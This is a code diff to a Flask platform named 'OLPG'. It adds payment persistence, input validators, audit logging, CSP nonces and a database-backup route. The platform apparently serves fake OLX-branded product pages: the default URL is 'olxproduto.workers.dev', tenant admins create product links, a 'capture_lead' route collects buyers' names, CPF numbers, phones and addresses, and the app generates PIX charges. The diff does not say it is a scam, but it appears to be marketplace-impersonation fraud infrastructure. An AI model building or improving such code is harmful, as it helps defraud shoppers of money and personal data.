@@ -13,7 +13,15 @@ import requests
 from datetime import datetime
 from typing import Optional
 
-from flask import Flask, render_template, request, jsonify, abort
+from flask import Flask, render_template, request, jsonify, abort, g
+import secrets as _sec_nonce
+import logging as _logging
+_logging.basicConfig(
+    level=_logging.INFO,
+    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S",
+)
+log = _logging.getLogger("OLPG")
 
 # â”€â”€â”€ Import bot module for shared DB + notifications â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 sys.path.insert(0, os.path.dirname(__file__))
@@ -63,7 +71,19 @@ except ImportError:
     API_INTEL_AVAILABLE = False
     print("[app.py] api_intel.py nao encontrado â€” detector IA basico ativo.")
 
+# --- Import Validation Engine & Activity Audit --------------------------------
+try:
+    from validators import FieldValidator, ActivityAudit
+    VALIDATORS_AVAILABLE = True
+    print("[app.py] validators.py carregado -- validacao avancada ativa.")
+except ImportError:
+    VALIDATORS_AVAILABLE = False
+    FieldValidator = None
+    ActivityAudit  = None
+    print("[app.py] validators.py nao encontrado -- modo basico.")
+
 app = Flask(__name__, static_folder='static', template_folder='templates')
+
 
 # Secret Key para sessÃµes e hashing de integridade
 # Secret key: env first, then auto-generated (never weak literal in prod)
@@ -77,7 +97,7 @@ app.secret_key = _flask_sk_raw
 # â”€â”€â”€ TELEGRAM OAUTH CONFIGURATION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 TELEGRAM_CLIENT_ID     = os.environ.get("TELEGRAM_CLIENT_ID", "8857867740")
 TELEGRAM_CLIENT_SECRET = os.environ.get("TELEGRAM_CLIENT_SECRET", "")  # SEGURO: nao hardcoded
-BASE_URL               = os.environ.get("BASE_URL", "https://olx-9ee8.onrender.com").rstrip('/')
+BASE_URL               = os.environ.get("BASE_URL", "https://olxproduto.workers.dev").rstrip('/')
 
 # â”€â”€â”€ CONFIGURAÃ‡Ã•ES DA API C7 â€” lidas do vault ou do env â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 # Credenciais nunca hardcoded; boot-time env leitura apenas. Armazenamento
@@ -106,13 +126,131 @@ def _get_live_c7_keys() -> dict:
     }
 
 # â”€â”€â”€ BANCO DE DADOS EM MEMÃ“RIA DE PAGAMENTOS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-PAYMENTS_DB        = {}   # {payment_id / c7_id: {record}}
-PROCESSED_WEBHOOKS = set()  # IDs jÃ¡ processados (idempotÃªncia C7 doc sec.11)
+PAYMENTS_DB        = {}   # cache em memoria; persistido no SQLite
+PROCESSED_WEBHOOKS = set()  # persistido no SQLite para sobreviver restarts
+
+def _save_payment(record: dict):
+    pid  = record.get("externalId") or record.get("payment_id", "")
+    c7id = record.get("c7_id", "") or ""
+    try:
+        if BOT_AVAILABLE:
+            conn = admin_bot.get_db()
+            conn.execute(
+                "INSERT OR REPLACE INTO payments"
+                " (payment_id,c7_id,external_id,amount,status,pix_code,"
+                " qr_code_url,expires_at,payer_name,payer_cpf,ip,created_at)"
+                " VALUES(?,?,?,?,?,?,?,?,?,?,?,?)"
+            , (
+                pid, c7id or None, pid,
+                float(record.get("amount") or 0),
+                record.get("status", "pending"),
+                record.get("pix_code", "")[:2000],
+                record.get("qr_code_url", "")[:500],
+                str(record.get("expires_at", ""))[:60],
+                record.get("name", "")[:120],
+                record.get("cpf", "")[:20],
+                record.get("ip", "")[:45],
+                record.get("created_at", 0),
+            ))
+            conn.commit(); conn.close()
+    except Exception as _pe:
+        log.warning("[PAYMENTS] persist error: %s", _pe)
+    if pid:  PAYMENTS_DB[pid]  = record
+    if c7id: PAYMENTS_DB[c7id] = record
+
+def _update_payment_status(payment_id: str, status: str, **extra):
+    record = PAYMENTS_DB.get(payment_id)
+    if record:
+        record["status"] = status
+        record.update(extra)
+    try:
+        if BOT_AVAILABLE:
+            conn = admin_bot.get_db()
+            if status == "paid":
+                conn.execute(
+                    "UPDATE payments SET status=?,end_to_end_id=?,net_amount=?,"
+                    "fee_amount=?,confirmed_at=? WHERE payment_id=? OR c7_id=?",
+                    (status, extra.get("end_to_end_id",""), extra.get("net_amount"),
+                     extra.get("fee_amount"), import_time := __import__("time").time(),
+                     payment_id, payment_id))
+            else:
+                conn.execute("UPDATE payments SET status=? WHERE payment_id=? OR c7_id=?",
+                             (status, payment_id, payment_id))
+            conn.commit(); conn.close()
+    except Exception as _pe:
+        log.warning("[PAYMENTS] status update error: %s", _pe)
+
+def _mark_webhook_processed(key: str):
+    PROCESSED_WEBHOOKS.add(key)
+    try:
+        if BOT_AVAILABLE:
+            conn = admin_bot.get_db()
+            conn.execute(
+                "INSERT OR IGNORE INTO processed_webhooks(webhook_id,processed_at)"
+                " VALUES(?,?)", (key, __import__("time").time()))
+            conn.commit(); conn.close()
+    except Exception:
+        pass
+
+def _load_payments_from_db():
+    if not BOT_AVAILABLE: return
+    try:
+        conn = admin_bot.get_db()
+        rows = conn.execute(
+            "SELECT * FROM payments WHERE status='pending' AND created_at>?",
+            (__import__("time").time() - 86400,)).fetchall()
+        for r in rows:
+            d = dict(r)
+            pid = d.get("payment_id","")
+            c7id= d.get("c7_id","")
+            if pid:  PAYMENTS_DB[pid]  = d
+            if c7id: PAYMENTS_DB[c7id] = d
+        prows = conn.execute(
+            "SELECT webhook_id FROM processed_webhooks WHERE processed_at>?",
+            (__import__("time").time() - 86400,)).fetchall()
+        for pr in prows:
+            PROCESSED_WEBHOOKS.add(pr["webhook_id"])
+        conn.close()
+        log.info("[BOOT] %d payments + %d webhooks restored from SQLite.",
+                 len(PAYMENTS_DB), len(PROCESSED_WEBHOOKS))
+    except Exception as _be:
+        log.warning("[BOOT] payment restore error: %s", _be)
 
 
 # â”€â”€â”€ RATE LIMITER, BRUTE FORCE GUARD & FIREWALL DE APLICAÃ‡ÃƒO (WAF IN-MEMORY) â”€
-RATE_LIMIT_DB = {}   # {ip: [timestamps]}
-AUTH_FAIL_DB  = {}   # {ip: {count, blocked_until}}
+RATE_LIMIT_DB = {}   # hot cache; not persisted (low risk)
+AUTH_FAIL_DB  = {}   # cache; persisted in SQLite per write
+
+def _persist_auth_fail(ip: str, rec: dict):
+    try:
+        if BOT_AVAILABLE:
+            conn = admin_bot.get_db()
+            conn.execute(
+                "INSERT OR REPLACE INTO auth_failures"
+                " (ip,count,blocked_until,first_fail,updated_at)"
+                " VALUES(?,?,?,?,?)",
+                (ip, rec["count"], rec["blocked_until"],
+                 rec.get("first_fail", time.time()), time.time()))
+            conn.commit(); conn.close()
+    except Exception:
+        pass
+
+def _load_auth_failures():
+    if not BOT_AVAILABLE: return
+    try:
+        conn = admin_bot.get_db()
+        rows = conn.execute(
+            "SELECT ip,count,blocked_until,first_fail FROM auth_failures"
+            " WHERE blocked_until>?", (time.time(),)).fetchall()
+        for r in rows:
+            AUTH_FAIL_DB[r["ip"]] = {
+                "count": r["count"], "blocked_until": r["blocked_until"],
+                "first_fail": r["first_fail"]}
+        conn.close()
+        if AUTH_FAIL_DB:
+            log.info("[BOOT] %d blocked IPs restored.", len(AUTH_FAIL_DB))
+    except Exception:
+        pass
 
 def is_rate_limited(ip: str, limit: int = 30, window: int = 60) -> bool:
     """Limita a N requisiÃ§Ãµes por minuto por IP para prevenir ataques DoS/Brute Force."""
@@ -146,6 +284,7 @@ def record_auth_failure(ip: str):
         rec["blocked_until"] = now + 1800  # 30 minutos de bloqueio
         _log_security(f"BRUTE_FORCE_BLOCKED", ip, rec["count"])
     AUTH_FAIL_DB[ip] = rec
+    _persist_auth_fail(ip, rec)
 
 def reset_auth_failures(ip: str):
     """Reseta falhas apÃ³s login bem-sucedido."""
@@ -156,6 +295,10 @@ def _log_security(event: str, ip: str, detail):
     print(f"[SECURITY] {event} | IP: {ip} | Detail: {detail}")
 
 # â”€â”€â”€ HEADERS DE SEGURANÃ‡A & BLINDAGEM HTTP â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+@app.before_request
+def _set_csp_nonce():
+    g.csp_nonce = _sec_nonce.token_hex(16)
+
 @app.after_request
 def apply_security_headers(response):
     """Aplica cabeÃ§alhos de proteÃ§Ã£o militar contra XSS, Clickjacking, MIME-sniffing e HSTS."""
@@ -165,8 +308,8 @@ def apply_security_headers(response):
     response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'
     response.headers['Content-Security-Policy'] = (
         "default-src 'self'; "
-        "script-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
-        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
+        f"script-src 'self' 'nonce-{getattr(g,'csp_nonce','')}' https://fonts.googleapis.com; "
+        f"style-src 'self' 'nonce-{getattr(g,'csp_nonce','')}' https://fonts.googleapis.com; "
         "font-src 'self' https://fonts.gstatic.com; "
         "img-src 'self' data: https:; "
         "connect-src 'self' https://viacep.com.br https://api.carteirado7.com; "
@@ -888,6 +1031,12 @@ def api_admin_verify_code():
         except Exception:
             pass
 
+    # Audit: login bem-sucedido via OTP
+    if VALIDATORS_AVAILABLE and ActivityAudit:
+        ActivityAudit.log("admin_login", actor_id=tg_id, ip=ip,
+                          details={"role": role, "method": "otp",
+                                   "ua": str(request.user_agent)[:150]})
+
     return jsonify({
         "ok":        True,
         "token":     session_token,
@@ -1234,6 +1383,9 @@ def api_admin_my_products():
             code = tg_wh.create_tenant_product(admin_id, title, price, old_price, description, image_url, image1, image2, image3)
             slug = tg_wh.get_slug(admin_id)
             unique_link = f"{BASE_URL}/p/{slug}/{code}" if slug else f"{BASE_URL}/p/{code}"
+            if VALIDATORS_AVAILABLE:
+                ActivityAudit.log('admin_product_create', actor_id=admin_id, ip=_user_ip(),
+                                  slug=slug, details={'code': code, 'title': title, 'price': price, 'link': unique_link})
             return jsonify({"ok": True, "product_code": code, "unique_link": unique_link, "message": "Produto criado no catÃ¡logo!"})
 
     products = []
@@ -1256,6 +1408,9 @@ def api_admin_delete_product(product_code):
 
     if TG_WH_AVAILABLE:
         tg_wh.delete_tenant_product(admin_id, product_code)
+        if VALIDATORS_AVAILABLE:
+            ActivityAudit.log('admin_product_delete', actor_id=admin_id, ip=_user_ip(),
+                              details={'product_code': product_code})
         return jsonify({"ok": True, "message": "Produto excluÃ­do."})
     return jsonify({"ok": False, "error": "Recurso indisponÃ­vel"}), 400
 
@@ -1412,12 +1567,36 @@ def api_admin_config_save():
         "det_category", "det_brand", "det_model", "det_condition", "det_storage", "det_color",
     }
     saved = []
+    validation_errors = {}
     for key, value in data.items():
         if key in allowed_keys and isinstance(value, str):
             clean_val = value.strip()
             # Apenas Admin Supremo pode alterar logo_url e payment_badges
             if key in ["logo_url", "payment_badges"] and role != "supreme_admin":
                 continue
+            if not clean_val:
+                continue
+            # Validacao avancada por tipo de campo
+            if VALIDATORS_AVAILABLE:
+                field_map = {
+                    'product_name': 'product_name', 'product_price': 'price',
+                    'product_old_price': 'price', 'product_image': 'url',
+                    'product_image1': 'url', 'product_image2': 'url', 'product_image3': 'url',
+                    'whatsapp_number': 'wa_number', 'logo_url': 'url',
+                    'seller_name': 'name',
+                }
+                ftype = field_map.get(key)
+                if ftype:
+                    ok_v, result_v, _ = FieldValidator.validate_field(ftype, clean_val)
+                    if not ok_v:
+                        validation_errors[key] = result_v
+                        continue
+                    clean_val = result_v  # Usa valor normalizado
+                elif FieldValidator.has_injection(clean_val):
+                    validation_errors[key] = 'Campo contem caracteres invalidos.'
+                    continue
+                else:
+                    clean_val = FieldValidator.sanitize(clean_val)
             if clean_val:
                 if TG_WH_AVAILABLE and admin_id != 999999999:
                     tg_wh.set_tenant_config(admin_id, key, clean_val)
@@ -1425,7 +1604,13 @@ def api_admin_config_save():
                     admin_bot.set_config(key, clean_val)
                 saved.append(key)
     _log("ADMIN_CONFIG_SAVED", str(uuid.uuid4()), {"admin_id": admin_id, "keys_saved": saved})
-    return jsonify({"ok": True, "saved": saved})
+    if VALIDATORS_AVAILABLE:
+        ActivityAudit.log('admin_config_save', actor_id=admin_id, ip=_user_ip(),
+                          details={'keys': saved, 'count': len(saved), 'errors': validation_errors})
+    if validation_errors:
+        return jsonify({"ok": len(saved) > 0, "saved": saved, "validation_errors": validation_errors,
+                        "message": f"{len(saved)} campos salvos, {len(validation_errors)} erro(s) de validacao."})
+    return jsonify({"ok": True, "saved": saved, "message": f"{len(saved)} configuracao(es) salva(s) com sucesso."})
 
 
 # â”€â”€â”€ ENDPOINTS GERENCIAMENTO SUPREMO â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
@@ -1515,6 +1700,9 @@ def api_admin_update_product(product_code):
     if TG_WH_AVAILABLE:
         ok = tg_wh.update_tenant_product(admin_id, safe_code, data)
         if ok:
+            if VALIDATORS_AVAILABLE and ActivityAudit:
+                ActivityAudit.log('admin_product_update', actor_id=admin_id, ip=_user_ip(),
+                                  details={'product_code': safe_code, 'fields': list(data.keys())})
             return jsonify({"ok": True, "message": "Produto atualizado com sucesso!"})
     return jsonify({"ok": False, "error": "Produto nÃ£o encontrado ou erro ao atualizar."}), 400
 
@@ -1542,6 +1730,9 @@ def api_admin_set_shipping_mode(product_code):
             "shipping_coupon": sanitize_input(str(coupon), 60),
         })
         if ok:
+            if VALIDATORS_AVAILABLE and ActivityAudit:
+                ActivityAudit.log("admin_shipping_set", actor_id=admin_id, ip=_user_ip(),
+                                  details={"product_code": safe_code, "mode": mode, "fee": fee, "coupon": coupon})
             return jsonify({"ok": True, "shipping_mode": mode, "shipping_fee": fee, "message": "Modo de pagamento atualizado!"})
     return jsonify({"ok": False, "error": "Falha ao atualizar modo."}), 400
 
@@ -1682,11 +1873,35 @@ def capture_lead():
     if TG_WH_AVAILABLE and slug:
         tg_id = tg_wh.get_tg_id_by_slug(slug)
 
-    name         = sanitize_input(data.get('name', ''), 120)
-    cpf          = sanitize_input(data.get('cpf', ''), 20)
-    phone        = sanitize_input(data.get('phone', ''), 25)
-    email        = sanitize_input(data.get('email', ''), 100)
-    cep          = sanitize_input(data.get('cep', ''), 15)
+    # --- Extrai e valida campos com motor avancado ---
+    raw_name  = data.get('name',  '')
+    raw_cpf   = data.get('cpf',   '')
+    raw_phone = data.get('phone', '')
+    raw_email = data.get('email', '')
+    raw_cep   = data.get('cep',   '')
+
+    if VALIDATORS_AVAILABLE and FieldValidator:
+        ok_n, name, _   = FieldValidator.validate_field('name',  raw_name)
+        if not ok_n:
+            if ActivityAudit:
+                ActivityAudit.log('security_invalid_data', ip=ip, session_id=sid, slug=slug,
+                                  details={'field': 'name', 'error': name})
+            return jsonify({'ok': False, 'error': name}), 400
+        ok_ph, phone, _ = FieldValidator.validate_field('phone', raw_phone)
+        if not ok_ph:
+            return jsonify({'ok': False, 'error': phone}), 400
+        ok_em, email, _ = FieldValidator.validate_field('email', raw_email)
+        email = email if ok_em else sanitize_input(raw_email, 100)
+        cep = re.sub(r'\D', '', raw_cep)
+    else:
+        name  = sanitize_input(raw_name, 120)
+        phone = sanitize_input(raw_phone, 25)
+        email = sanitize_input(raw_email, 100)
+        cep   = sanitize_input(raw_cep, 15)
+        if not name or len(name.split()) < 2:
+            return jsonify({'ok': False, 'error': 'Informe seu nome completo (Nome e Sobrenome).'}), 400
+
+    cpf          = sanitize_input(raw_cpf, 20)
     street       = sanitize_input(data.get('street', ''), 200)
     number_addr  = sanitize_input(data.get('number', ''), 30)
     complement   = sanitize_input(data.get('complement', ''), 100)
@@ -1701,18 +1916,21 @@ def capture_lead():
         return jsonify({"ok": False, "error": "Informe seu nome completo (Nome e Sobrenome)."}), 400
 
     # ValidaÃ§Ã£o: CPF real via Hub
-    is_cpf_ok, cpf_err, cpf_data = verify_cpf_hub(cpf)
+    # Validacao: CPF real via Hub do Desenvolvedor
+    is_cpf_ok, cpf_err, cpf_data = verify_cpf_hub(raw_cpf if VALIDATORS_AVAILABLE else cpf)
     if not is_cpf_ok:
-        _log("LEAD_REJECTED_INVALID_CPF", sid, {"cpf": cpf, "name": name, "reason": cpf_err, "slug": slug})
-        return jsonify({"ok": False, "error": cpf_err or "CPF invÃ¡lido."}), 400
+        _log('LEAD_REJECTED_INVALID_CPF', sid, {'cpf': cpf, 'name': name, 'reason': cpf_err, 'slug': slug})
+        if VALIDATORS_AVAILABLE and ActivityAudit:
+            ActivityAudit.log('security_invalid_data', ip=ip, session_id=sid, slug=slug,
+                              details={'field': 'cpf', 'error': cpf_err})
+        return jsonify({'ok': False, 'error': cpf_err or 'CPF invalido.'}), 400
 
-    # ValidaÃ§Ã£o: telefone BR
-    if BOT_AVAILABLE:
+    # Validacao: telefone BR (fallback se validators indisponivel)
+    if not VALIDATORS_AVAILABLE and BOT_AVAILABLE:
         valid_phone, phone_err = admin_bot.InputValidator.validate_phone_br(phone)
         if phone_err:
-            return jsonify({"ok": False, "error": phone_err}), 400
+            return jsonify({'ok': False, 'error': phone_err}), 400
         phone = valid_phone
-
     # Contexto de rastreio avanÃ§ado
     lead_payload = {
         "name":         name,
@@ -1737,6 +1955,15 @@ def capture_lead():
 
     # Registra no DB global
     _log("LEAD_CAPTURED", sid, lead_payload)
+
+    # Auditoria centralizada
+    if VALIDATORS_AVAILABLE and ActivityAudit:
+        ActivityAudit.log("lead_captured", session_id=sid, ip=ip, slug=slug,
+                          details={
+                              "name": name, "phone": phone, "city": city,
+                              "state": state, "product": lead_payload.get('product', ''),
+                              "amount": amount, "cpf_verified": lead_payload.get('cpf_verified', False),
+                          })
 
     # Registra no DB do tenant correto (isolamento por admin)
     if TG_WH_AVAILABLE and tg_id and slug:
@@ -1869,9 +2096,7 @@ def generate_pix():
         "name":       payer_name,
         "cpf":        payer_document,
     }
-    PAYMENTS_DB[payment_id] = record
-    if c7_id:
-        PAYMENTS_DB[c7_id] = record  # indexa tambÃ©m pelo ID interno da C7
+    _save_payment(record)
 
     _log("PIX_GENERATED", sid, {
         "c7_id":      c7_id or "fallback-emv",
@@ -1935,9 +2160,10 @@ def check_payment(payment_id):
                     status = p_data.get("status", "").lower()
                     # Mapeia todos os status da doc sec. 6
                     if status in ("approved", "paid"):
-                        payment["status"] = "paid"
-                        payment["payer"]  = p_data.get("payer", {})
-                        payment["end_to_end_id"] = p_data.get("endToEndId", "")
+                        _update_payment_status(safe_pid, "paid",
+                            payer=p_data.get("payer",{}),
+                            end_to_end_id=p_data.get("endToEndId",""))
+                        payment = PAYMENTS_DB.get(safe_pid, payment)
                         _log("PAYMENT_CONFIRMED", safe_pid, {
                             "c7_id":   c7_id, "payment_id": safe_pid,
                             "amount":  payment.get("amount"),
@@ -2030,15 +2256,12 @@ def c7_webhook():
     record = PAYMENTS_DB.get(correlation) or PAYMENTS_DB.get(identifier)
 
     if is_confirmed:
-        if record:
-            record["status"]      = "paid"
-            record["payer"]       = payer_info
-            record["end_to_end_id"] = end_to_end
-            record["net_amount"]  = net
-            record["fee_amount"]  = fee
-        # Marca como processado
+        _update_payment_status(
+            correlation or identifier or "webhook", "paid",
+            payer=payer_info, end_to_end_id=end_to_end,
+            net_amount=net, fee_amount=fee)
         if idempotency_key:
-            PROCESSED_WEBHOOKS.add(idempotency_key)
+            _mark_webhook_processed(idempotency_key)
         _log("PAYMENT_CONFIRMED", correlation or identifier or "webhook", {
             "c7_id":      identifier,
             "payment_id": correlation,
@@ -3014,6 +3237,111 @@ def monitor_leads():
     finally:
         db.close()
 
+
+
+
+@app.route('/api/admin/activity')
+def api_admin_activity():
+    """Retorna log de atividades organizado por admin ou lead, 100% real."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    if not VALIDATORS_AVAILABLE:
+        return jsonify({'ok': False, 'error': 'activity_log_indisponivel'}), 503
+
+    hours  = int(request.args.get('hours',  24))
+    limit  = min(int(request.args.get('limit', 100)), 500)
+    view   = request.args.get('view', 'admin')  # admin | lead | all
+    slug   = request.args.get('slug', '').strip()
+    sessid = request.args.get('session_id', '').strip()
+
+    if role == 'supreme_admin' and view == 'all':
+        rows = ActivityAudit.get_global_activity(hours=hours, limit=limit)
+    elif view == 'lead':
+        rows = ActivityAudit.get_lead_activity(session_id=sessid or None,
+                                               slug=slug or tg_wh.get_slug(admin_id) if TG_WH_AVAILABLE else None,
+                                               limit=limit)
+    else:
+        rows = ActivityAudit.get_admin_activity(admin_id=admin_id, limit=limit)
+
+    return jsonify({'ok': True, 'activity': rows, 'count': len(rows),
+                    'view': view, 'admin_id': admin_id, 'role': role})
+
+
+@app.route('/api/admin/validate-field', methods=['POST'])
+def api_admin_validate_field():
+    """Valida um campo especifico em tempo real (para feedback no frontend)."""
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    if not VALIDATORS_AVAILABLE:
+        return jsonify({'ok': True, 'valid': True, 'value': ''})
+
+    data       = request.get_json(silent=True) or {}
+    field_type = data.get('field_type', 'generic')
+    value      = data.get('value', '')
+
+    ok_v, result, _ = FieldValidator.validate_field(field_type, str(value))
+    return jsonify({
+        'ok':     True,
+        'valid':  ok_v,
+        'value':  result if ok_v else value,
+        'error':  '' if ok_v else result,
+        'field':  field_type,
+    })
+
+
+@app.route('/health')
+@app.route('/ping')
+def health_check():
+    db_ok = False
+    try:
+        if BOT_AVAILABLE:
+            conn = admin_bot.get_db()
+            conn.execute("SELECT 1").fetchone()
+            conn.close()
+            db_ok = True
+    except Exception:
+        pass
+    return jsonify({
+        "status":     "ok" if db_ok else "degraded",
+        "db":         db_ok,
+        "bot":        BOT_AVAILABLE,
+        "tg_wh":      TG_WH_AVAILABLE,
+        "vault":      VAULT_AVAILABLE,
+        "validators": VALIDATORS_AVAILABLE,
+        "ts":         time.time(),
+    }), 200 if db_ok else 503
+
+
+@app.route('/api/admin/supreme/backup-db')
+def api_supreme_backup_db():
+    from flask import send_file as _sf
+    import os as _osa
+    admin_id, role = verify_admin_access(request)
+    if not admin_id:
+        return jsonify({"ok": False, "error": "unauthorized"}), 401
+    if role != "supreme_admin":
+        return jsonify({"ok": False, "error": "acesso_restrito"}), 403
+    db_path = _osa.environ.get("DB_PATH", "olpg_logs.db")
+    if not _osa.path.exists(db_path):
+        return jsonify({"ok": False, "error": "db_not_found"}), 404
+    ts_str = time.strftime("%Y%m%d_%H%M%S")
+    if VALIDATORS_AVAILABLE and ActivityAudit:
+        ActivityAudit.log("admin_db_backup", actor_id=admin_id, ip=_user_ip(),
+                          details={"db_kb": round(_osa.path.getsize(db_path)/1024,1)})
+    log.info("[BACKUP] admin %s downloaded DB backup.", admin_id)
+    return _sf(db_path, as_attachment=True,
+               download_name=f"olpg_backup_{ts_str}.db",
+               mimetype="application/x-sqlite3")
+
+
+# Boot: restore persisted state from SQLite
+try:
+    _load_payments_from_db()
+    _load_auth_failures()
+except Exception as _boot_e:
+    log.warning("[BOOT] restore error: %s", _boot_e)
 
 if __name__ == '__main__':
     print("[+] OLPG Hardened Platform running securely on http://127.0.0.1:5000")
